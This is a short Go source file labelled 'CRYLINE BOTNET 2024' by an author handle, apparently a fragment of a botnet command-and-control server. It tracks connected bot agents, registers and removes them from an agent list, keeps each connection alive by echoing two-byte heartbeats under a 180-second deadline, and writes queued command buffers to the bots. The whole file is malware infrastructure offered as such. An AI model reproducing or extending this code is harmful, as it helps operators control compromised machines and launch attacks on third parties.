/* 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;; CRYLINE BOTNET 2024  ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;      by @DarxiS      ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
*/

package main

import (
    "net"
    "time"
)

type __AGENT struct {
    _UID int
    _CONNECTION net.Conn
    _VERSION byte
    _SOURCE string
}

func __GET_NEW_AGENT(_CONNECTION net.Conn, _VERSION byte, _SOURCE string) *__AGENT {
    return &__AGENT{-1, _CONNECTION, _VERSION, _SOURCE}
}

func (_THIS *__AGENT) Handle() {
    __AGENT_LIST.__CONNECTED_NEW_BOTNET_AGENT(_THIS)

    defer __AGENT_LIST.__DISCONNECTED_BOTNET_AGENT(_THIS)

    _BUFFER := make([]byte, 2)

    for {
        _THIS._CONNECTION.SetDeadline(time.Now().Add(180 * time.Second))

        if _SETTER,_GET_ERROR := _THIS._CONNECTION.Read(_BUFFER); _GET_ERROR != nil || _SETTER != len(_BUFFER) {
            return
        }

        if _SETTER,_GET_ERROR := _THIS._CONNECTION.Write(_BUFFER); _GET_ERROR != nil || _SETTER != len(_BUFFER) {
            return
        }
    }
}

func (_THIS *__AGENT) __QUEUE_BUFFER(_BUFFER []byte) {
    _THIS._CONNECTION.Write(_BUFFER)
}
